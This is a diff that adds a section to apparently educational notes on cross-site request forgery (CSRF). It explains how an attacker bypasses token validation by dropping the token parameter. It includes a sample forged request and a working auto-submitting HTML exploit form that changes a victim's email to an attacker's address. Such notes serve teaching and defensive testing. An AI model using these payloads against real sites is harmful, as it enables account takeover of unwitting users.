@@ -54,3 +54,28 @@ Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
       document.forms[0].submit();
   </script>
 ```
+
+# Validation of CSRF token depends on token being present
+Some applications correctly validate the token when it is present but skip the validation if the token is omitted.
+
+In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack:
+<i>
+  POST /email/change HTTP/1.1
+  Host: vulnerable-website.com
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 25
+  Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
+
+  email=pwned@evil-user.net
+</i>
+
+Exploit example:
+ ``` html
+  <form method="POST" action="https://vulnerablesite/email/change-email">                        
+    <input type="hidden" name="email" value="atacker@email">                    
+  </form>
+<script>
+      document.forms[0].submit();
+</script>
+
+```
